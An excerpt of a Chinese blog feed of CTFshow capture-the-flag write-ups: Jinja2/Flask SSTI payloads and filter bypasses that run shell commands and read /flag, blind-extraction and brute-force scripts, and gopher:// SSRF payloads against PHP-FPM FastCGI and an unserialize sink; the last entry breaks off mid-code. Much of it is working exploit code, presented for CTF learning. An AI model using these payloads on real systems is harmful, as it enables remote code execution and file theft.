    <content type="html"><![CDATA[<h5 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">变量块 &#123;&#123;&#125;&#125;    用于将表达式打印到模板输出</span><br><span class="line">注释块 &#123;##&#125;    注释</span><br><span class="line">控制块    &#123;%%&#125;    可以声明变量，也可以执行语句</span><br><span class="line">行声明    ##        可以有和&#123;%%&#125;相同的效果</span><br></pre></td></tr></table></figure><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__class__           查看对象所在的类</span><br><span class="line">__mro__             查看继承关系和调用顺序，返回元组</span><br><span class="line">__base__            返回基类</span><br><span class="line">__bases__           返回基类元组</span><br><span class="line">__subclasses__()    返回子类列表</span><br><span class="line">__init__            调用初始化函数，可以用来跳到__globals__</span><br><span class="line">__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典</span><br><span class="line">__builtins__        返回内建内建名称空间字典</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）        都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量</span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1        get传参</span><br><span class="line">request.values.x1      所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1        post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data           post传参    (Content-Type:a/b)</span><br><span class="line">request.json         post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">int()        将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()        将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()        将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()        将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()        把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()    把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()        截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()    计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()    字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)    替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)    截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()    删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e    转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()        禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()        将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()    将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()        将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()        返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()        返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()        返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)    格式化字符串。比如：&#123;&#123;&quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()    返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()        返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()        返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)    如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()    返回字符串的长度，别名是count</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.随便找一个内置类对象用__class__拿到他所对应的类</span><br><span class="line">2.用__bases__拿到基类（&lt;class &#x27;object&#x27;&gt;）</span><br><span class="line">3.用__subclasses__()拿到子类列表</span><br><span class="line">4.在子类列表中直接寻找可以利用的类getshell</span><br><span class="line"></span><br><span class="line">对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数</span><br></pre></td></tr></table></figure><h2 id="web361-无过滤"><a href="#web361-无过滤" class="headerlink" title="web361-无过滤"></a>web361-无过滤</h2><p>?name&#x3D;49</p><p>回显49，说明执行了语句</p><p>查找可以利用的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>接下来就是要命令执行</p><p>比如我们要选择eval函数，就要找到包含 <code>eval</code> 函数的类，这里我知道eval函数在 <code>&lt;class &#39;warnings.catch_warnings&#39;&gt;里</code></p><p>利用脚本查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://9f7c273f-592e-4f44-bec2-fcc399bdf13a.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;]&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;warnings.catch_warnings&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><p>输出185</p><p>然后利用利用.<strong>init</strong>.<strong>globals</strong>来找os类中的。init初始化，globals全局查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>之后搜索eval可发现built-in function即<strong>内置函数</strong>，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__[&#x27;eval&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure><p>因此无法通<code>__gloables__[&#39;eval&#39;]</code>直接调用内置函数，python的内置函数和对象全局可用，但他们不是函数内部的一部分。因此要在内部访问内置函数eval或os，需要通过<code>__builtins__</code>来访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>2.另一种方法：</p><p>找os._wrap_close类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://9f7c273f-592e-4f44-bec2-fcc399bdf13a.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;]&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;os._wrap_close&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><p>输出132</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>其中能看到popen，于是利用其来执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>lipsum</strong> 和 cycler 执行命令(不需要索引)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(&#x27;ls /&#x27;).read()&#125;&#125;  也行</span><br></pre></td></tr></table></figure><h2 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h2><p>同上一题第一三种方法，或者第二种方法中数字改为全角数字</p><h2 id="web363-过滤引号-“-‘"><a href="#web363-过滤引号-“-‘" class="headerlink" title="web363(过滤引号) “ ‘"></a>web363(过滤引号) “ ‘</h2><p>1.通过<strong>request.args</strong>的get传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(request.args.a).read()&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><p><strong>2. 也通过request.form的post传参</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(request.form.cmd).read()&#125;&#125;</span><br><span class="line">post传：cmd=cat /flag</span><br></pre></td></tr></table></figure><p>3.chr拼接</p><p>其实就是将被单引号笼罩的字符换为ascii值,然后用+（%2b)连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(chr(108)%2bchr(115)%2bchr(32)%2bchr(47)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>4.还可以使用cookies传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(request.cookies.cmd).read()&#125;&#125;</span><br><span class="line">cookie传：cmd=cat /flag</span><br></pre></td></tr></table></figure><h2 id="364-过滤args-”-‘"><a href="#364-过滤args-”-‘" class="headerlink" title="364.过滤args,” ‘"></a>364.过滤args,” ‘</h2><p><code>values</code> 可以获取所有参数，从而绕过 args<br>366.过滤[],args “ ‘ _（attr方法）</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h2 id="367-过滤-args-“-‘-os"><a href="#367-过滤-args-“-‘-os" class="headerlink" title="367.过滤[],args “ ‘ _ os"></a>367.过滤[],args “ ‘ _ os</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;c=cat%20/flag&amp;b=os</span><br></pre></td></tr></table></figure><h2 id="368-过滤-args-“-‘-os花括号"><a href="#368-过滤-args-“-‘-os花括号" class="headerlink" title="368.过滤[],args “ ‘ _ os花括号"></a>368.过滤[],args “ ‘ _ os花括号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;&amp;a=__globals__&amp;c=cat%20/flag&amp;b=os</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**方法二：&#123;%%&#125;盲注**</span><br></pre></td></tr></table></figure><p>原理</p><blockquote><p><code>open(&#39;/flag&#39;).read()</code>是回显整个文件，但是read函数里加上参数：<code>open(&#39;/flag&#39;).read(1)</code>，返回的就是读出所读的文件里的i个字符，以此类推，就可以盲注出了</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># anthor:秀儿</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://3db27dbc-dccc-46d0-bc78-eff3fc21af74.chall.ctf.show:8080/&quot;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in &quot;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&quot;:</span><br><span class="line">        params=&#123;</span><br><span class="line"></span><br><span class="line">            &#x27;name&#x27;:&quot;&#123;</span><br><span class="line">   &#123;% set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(&#123;&#125;) %&#125;&#125;&#123;</span><br><span class="line">   &#123;% if a==request.values.d %&#125;&#125;feng&#123;</span><br><span class="line">   &#123;% endif %&#125;&#125;&quot;.format(i),</span><br><span class="line">            &#x27;a&#x27;:&#x27;__globals__&#x27;,</span><br><span class="line">            &#x27;b&#x27;:&#x27;__builtins__&#x27;,</span><br><span class="line">            &#x27;c&#x27;:&#x27;/flag&#x27;,</span><br><span class="line">            &#x27;d&#x27;:f&#x27;&#123;flag+j&#125;&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.get(url=url,params=params)</span><br><span class="line">        if &quot;feng&quot; in r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            if j==&quot;&#125;&quot;:</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意name那里用了<code>&#123; &#123;和&#125;&#125;</code>，这是因为我用的format格式化字符串，用<code>&#123;&#125;</code>来占位，如果里面本来就有<code>&#123;</code>和<code>&#125;</code>的话，就需要用<code>&#123; &#123;</code>和<code>&#125;&#125;</code>来代替<code>&#123;</code>和<code>&#125;</code></p><h2 id="369-过滤-args-“-‘-os"><a href="#369-过滤-args-“-‘-os" class="headerlink" title="369.过滤[],args “ ‘ _ os"></a>369.过滤[],args “ ‘ _ os</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;代码块&quot;&gt;&lt;a href=&quot;#代码块&quot; class=&quot;headerlink&quot; title=&quot;代码块&quot;&gt;&lt;/a&gt;代码块&lt;/h5&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Gopher协议打FastCGI（端口9000）</title>
    <link href="http://1768161086.github,io/2025/03/05/Gopher%E5%8D%8F%E8%AE%AE%E6%89%93FastCGI%EF%BC%88%E7%AB%AF%E5%8F%A39000%EF%BC%89/"/>
    <id>http://1768161086.github,io/2025/03/05/Gopher%E5%8D%8F%E8%AE%AE%E6%89%93FastCGI%EF%BC%88%E7%AB%AF%E5%8F%A39000%EF%BC%89/</id>
    <published>2025-03-05T07:48:11.000Z</published>
    <updated>2025-03-05T08:16:57.856Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="CTFshow-代码审计-web309"><a href="#CTFshow-代码审计-web309" class="headerlink" title="CTFshow 代码审计 web309"></a>CTFshow 代码审计 web309</h1></blockquote><p>1.题目描述：需要拿shell，308的方法不行了,mysql 有密码了。</p><p>2.手动扫描开放的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#一些危险的端口</span><br><span class="line">#21 ftp</span><br><span class="line">#22 ssh</span><br><span class="line">#80 http</span><br><span class="line">#443 https</span><br><span class="line">#3389 rdp windows远程桌面</span><br><span class="line">#1433 ms-sqlserver 默认端口</span><br><span class="line">#3306 mysql 默认端口</span><br><span class="line">#6379 redis 默认端口</span><br><span class="line">#9000 php-fpm(FastCGI) 默认端口</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    $this-&gt;config=new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class config&#123;</span><br><span class="line">     public $update_url = &#x27;gopher://127.0.0.1:【端口】&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>burpsuit抓包，端口设置成9000时候一直未响应。那就是9000端口存在服务.</p><p>3.FastCGI攻击需要满足四个条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、PHP版本要高于5.3.3，才能动态修改PHP.INI配置文件</span><br><span class="line">2、知道题目环境中的一个PHP文件的绝对路径</span><br><span class="line">3、PHP-FPM监听在本机9000端口</span><br><span class="line">4、libcurl版本&gt;=7.45.0</span><br></pre></td></tr></table></figure><p>4.Gopherus工具生成攻击FastCGI的payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure><p>之后有两个地方可以输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一个地方输入：</span><br><span class="line">一个已知存在的php文件如/var/www/html/index.php  </span><br><span class="line"></span><br><span class="line">第二个地方输入：</span><br><span class="line">希望目标服务器执行的恶意命令，比如反弹shell：</span><br><span class="line">tac f* 或</span><br></pre></td></tr></table></figure><p>5.输入后得到payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27tac%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p>6.6.访问index.php修改cookie得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;CTFshow-代码审计-web309&quot;&gt;&lt;a href=&quot;#CTFshow-代码审计-web309&quot; class=&quot;headerlink&quot; title=&quot;CTFshow 代码审计 web309&quot;&gt;&lt;/a&gt;CTFshow 代码审计 web</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>gopher协议无密码注入mysql</title>
    <link href="http://1768161086.github,io/2025/03/05/ctfshow-web308/"/>
    <id>http://1768161086.github,io/2025/03/05/ctfshow-web308/</id>
    <published>2025-03-05T07:27:20.000Z</published>
    <updated>2025-03-06T13:12:22.339Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="CTFshow-代码审计-web308"><a href="#CTFshow-代码审计-web308" class="headerlink" title="CTFshow 代码审计 web308"></a>CTFshow 代码审计 web308</h1></blockquote><p>1.题目描述：需要拿shell</p><p>2.代码审计</p><p>3.<strong>SQL注入：</strong></p><p>无明显注入点，无SQL报错信息输出，insert语句都上了waf。SQL注入不可行。</p><p>4.<strong>反序列化写入文件：</strong></p><p>有无过滤的<code>file_put_contents()</code>函数却从未被调用。</p><p>5.<strong>反序列化执行命令：</strong> public function clearCache()</p><p>上了waf，只能输入大小写字母。</p><p>6.在<code>fun.php</code>的<code>checkUpdate()</code>函数中发现了明显的SSRF特征代码，而且没有过滤。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">        $ch=curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, false);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);</span><br><span class="line">        $res = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>7.我们把所有有关的代码都整合起来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//【index.php】</span><br><span class="line">$service = unserialize(base64_decode($_COOKIE[&#x27;service&#x27;]));</span><br><span class="line">if($service)&#123;</span><br><span class="line">    $lastVersion=$service-&gt;checkVersion();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【dao.php】</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line"></span><br><span class="line">    public function checkVersion()&#123;</span><br><span class="line">            return checkUpdate($this-&gt;config-&gt;update_url);</span><br><span class="line">        